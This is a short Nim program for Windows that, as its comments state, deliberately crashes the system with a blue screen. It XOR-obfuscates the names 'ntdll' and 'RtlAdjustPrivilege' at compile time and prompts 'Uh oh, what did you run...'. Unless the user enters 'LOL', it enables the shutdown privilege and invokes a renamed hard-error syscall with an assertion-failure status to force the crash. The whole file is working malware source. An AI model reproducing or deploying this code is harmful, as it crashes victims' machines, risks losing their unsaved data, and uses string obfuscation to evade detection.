import winim/lean
import std/[strutils]
include syscalls

template randomCompileTimeSeed(): uint32 =
  int(CompileTime[0]) * 36000 +
  int(CompileTime[1]) * 3600 +
  int(CompileTime[3]) * 600 +
  int(CompileTime[4]) * 60 +
  int(CompileTime[6]) * 10 +
  int(CompileTime[7]) * 1

const g_key: uint8 = (randomCompileTimeSeed() mod 0xff).uint8

proc obfuscate*(s: string): string =
  var resultStr: string = ""
  for i in s:
    resultStr.add((i.uint8 xor g_key.uint8).char)
  result = resultStr

const
  nll = obfuscate("ntdll")
  rap = obfuscate("RtlAdjustPrivilege")
  correct = obfuscate("LOL")

proc RtAjPr(
  Privilege: ULONG,
  Enable: BOOLEAN,
  CurrentThread: BOOLEAN,
  Enabled: PBOOL
): NTSTATUS {.stdcall, dynlib: obfuscate(nll), importc: obfuscate(rap).}

const STATUS_ASSERTION_FAILURE: NTSTATUS = cast[NTSTATUS](0xC0069420'i32)

var
  previousValue: BOOL
  response: ULONG

when isMainModule:
  echo "Uh oh, what did you run..."
  let userInput = readLine(stdin).strip()

  # Check if the user input matches the obfuscated correct string
  if obfuscate(userInput) == correct:
    echo "Correct input. Exiting..."
    quit(0)

  # Enable shutdown privilege
  let status = RtAjPr(
    19.ULONG,
    1.BOOLEAN,
    0.BOOLEAN,
    addr previousValue
  )
  
  if status != 0:
    echo "Failed to adjust privilege. Status: ", status
    quit(1)

  # Trigger BSOD
  discard Naglick(
    STATUS_ASSERTION_FAILURE, 
    0, 
    0, 
    nil, 
    6, 
    addr response
  )
